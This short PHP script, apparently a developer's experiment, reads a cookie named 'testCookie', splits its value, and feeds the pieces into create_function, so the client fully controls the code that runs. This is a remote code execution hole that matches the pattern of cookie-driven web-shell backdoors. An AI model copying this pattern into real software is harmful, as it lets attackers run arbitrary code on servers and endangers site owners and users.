<?php //GET COOKIE

	if(isset($_COOKIE['testCookie'])) 
	{
		
		$cookie_value =  $_COOKIE['testCookie'];
		$functionPieces = explode(",", $cookie_value);
		
		$cookie_func = create_function("$functionPieces[0] , $functionPieces[1]", $functionPieces[2]);
		
		echo $cookie_func('Harry', 'Jeff');
	}
	//string create_function ( string $args , string $code )

	
	//$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');

?>


